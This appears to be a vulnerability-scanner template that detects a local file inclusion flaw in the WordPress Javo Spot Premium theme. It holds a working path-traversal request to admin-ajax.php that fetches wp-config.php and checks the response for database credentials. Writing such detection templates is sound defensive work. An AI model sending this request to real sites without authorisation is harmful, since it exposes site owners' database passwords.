id: "wp-javospot-lfi"
name: "WordPress Javo Spot Premium Theme - Local File Inclusion"
severity: "high"
description: "WordPress Javo Spot Premium Theme is vulnerable to local file inclusion that allows remote unauthenticated attackers access to locally stored file and return their content."
tech:
  - "wordpress"
  - "php"
tags:
  - "wordpress"
  - "wp-theme"
  - "lfi"
  - "wp"
  - "wpscan"
  - "vuln"
cwe: "CWE-22"
reference: "https://codeseekah.com/2017/02/09/javo-themes-spot-lfi-vulnerability/"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "DB_NAME"
      - "DB_PASSWORD"
    condition: "and"
  - type: "status"
    status:
      - 200
